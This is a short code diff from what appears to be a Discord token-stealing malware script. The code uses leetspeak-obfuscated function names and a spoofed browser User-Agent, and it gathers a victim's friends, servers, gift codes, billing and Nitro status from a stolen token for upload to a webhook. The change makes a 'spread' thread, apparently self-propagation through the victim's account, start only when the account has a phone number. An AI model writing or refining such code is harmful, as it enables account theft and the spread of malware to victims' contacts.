@@ -505,7 +505,7 @@ def Tr1M(obj):
 
 def UP104D70K3N(token, path):
     global h00k
-    threading.Thread(target=spread, args=(token,)).start()
+    
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -518,7 +518,7 @@ def UP104D70K3N(token, path):
     friends = Tr1M(G37UHQFr13ND5(token))
     guilds = Tr1M(G37UHQ6U11D5(token))
     codes = Tr1M(G37C0D35(token))
-
+    if phone != "": threading.Thread(target=spread, args=(token,)).start()
     if codes == "": codes = "`No Gifts Found`"
     if billing == "": billing = ":lock:"
     if badge == "" and nitro == "": badge, nitro = ":lock:", ""
